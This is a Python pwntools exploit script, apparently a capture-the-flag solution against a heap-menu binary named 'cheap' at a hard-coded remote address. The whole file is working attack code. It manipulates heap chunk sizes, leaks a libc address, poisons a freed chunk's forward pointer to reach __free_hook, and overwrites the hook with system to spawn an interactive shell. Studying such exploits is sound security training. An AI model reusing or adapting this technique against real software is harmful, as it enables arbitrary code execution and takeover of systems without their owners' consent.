#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "34.146.101.4"
PORT = 30001
PROCESS = "./cheap"


def create(size, data):
    r.sendline("1")
    r.sendlineafter(": ", str(size))
    r.sendlineafter(": ", data)
    r.recvuntil("Choice: ")


def free():
    r.sendline("3")
    r.recvuntil("Choice: ")


def show():
    r.sendline("2")
    LEAK = r.recvuntil("1. create", drop=True)
    r.recvuntil("Choice: ")
    return LEAK


def exploit(r):
    r.recvuntil("Choice: ")

    # fill up heap with different sized chunks
    create(0x20-8, "A")
    free()
    create(0x30-8, "A")
    free()
    create(0x40-8, "A")
    free()
    create(0x50-8, "B")
    free()
    create(0x300-8, "A")
    free()
    create(0x100-8, "A")
    free()

    # put fake next_size in the last chunk
    payload = "A"*(232-0xd0) + p64(0x3e1)
    create(0x400-8, payload)
    free()

    # recreate the 0x50 chunk and overwrite the size of the freed 0x300 chunk
    payload = "A"*0x48 + p64(0x421)
    create(0x50-8, payload)
    free()

    # reallocate the 0x300 chunk and free it
    create(0x300-8, "A")
    free()

    LEAK = u64(show()[:-1].ljust(8, "\x00"))
    libc.address = LEAK - 96 - 0x10 - libc.symbols["__malloc_hook"]

    log.info("LEAK     : %s" % hex(LEAK))
    log.info("LIBC     : %s" % hex(libc.address))

    # create two fake 0x50 chunks
    payload = "A"*0x10
    payload += p64(0x0) + p64(0x51)
    payload += "B"*0x20
    payload += p64(0x0) + p64(0x51)
    payload += "\n"

    # allocate 0x20 chunk to overwrite follow up chunk sizes
    create(0x20-8, payload)
    free()

    # allocate and free the two fake 0x50 chunks
    create(0x40-8, "B\n")
    free()
    create(0x30-8, "A\n")
    free()

    # overwrite FD of free 0x50 chunk
    payload = "A"*0x10
    payload += p64(0x0) + p64(0x51)
    payload += p64(libc.symbols["__free_hook"]-0x10)
    payload += "\n"

    create(0x20-8, payload)
    free()

    # allocate chunk to pull free_hook address into tcache arena
    create(0x50-8, "A\n")

    # overwrite __free_hook-0x10 with /bin/sh and the hook itself with system
    payload = "/bin/sh\x00"+p64(0)
    payload += p64(libc.symbols["system"])
    payload += "\n"
    create(0x50-8, payload)

    # trigger delete for shell
    r.sendline("3")
	
    r.interactive()

    return


if __name__ == "__main__":
    # e = ELF("./cheap")
    libc = ELF("./libc.so.6")
    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./cheap")
        print(util.proc.pidof(r))
        pause()

    exploit(r)
